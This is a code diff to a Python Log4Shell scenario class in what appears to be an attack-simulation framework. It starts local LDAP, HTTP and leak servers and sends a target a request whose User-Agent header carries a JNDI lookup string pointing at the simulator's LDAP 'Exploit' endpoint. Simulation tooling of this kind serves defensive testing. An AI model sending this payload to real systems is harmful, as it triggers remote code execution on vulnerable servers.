@@ -2,6 +2,7 @@ import scenarios.log4shell.sim.build_servers as bs
 from models.base_simulation import BaseSimulation
 import asyncio, random, requests
 from threading import Thread
+from time import sleep
 
 class LOG4SHELL(BaseSimulation):
     def __init__(self):
@@ -16,10 +17,13 @@ class LOG4SHELL(BaseSimulation):
             'Android Chrome/89.0'
         ]
 
-        print('Starting Redirect Server')
+    def setup(self):
+        self.ldap = bs.start_ldap_server()
         Thread(target=bs.start_http_server, daemon=True).start()
-        print('Starting LDAP Server')
-        self.ldap_proc = bs.start_ldap_server()
+        Thread(target=bs.start_leak_server, args=(False,), daemon=True).start()
+
+        print('[+] Waiting for servers to startup...')
+        sleep(3)
 
     def name(self) -> str:
         return 'LOG4SHELL'
@@ -44,11 +48,8 @@ class LOG4SHELL(BaseSimulation):
             'User-Agent': f'${{jndi:ldap://{bs.get_host_ip()}:1389/Exploit}}'
         }
 
-        try:
-            requests.get(self.url, headers=headers, timeout=5)
-        except Exception as e:
-            print(f'[!] Request failed: {e}')
+        requests.get(self.url, headers=headers, timeout=5)
 
     def cleanup(self):
-        if self.ldap_proc != None:
-            self.ldap_proc.terminate()
+        self.ldap.terminate()
+        self.ldap.wait()
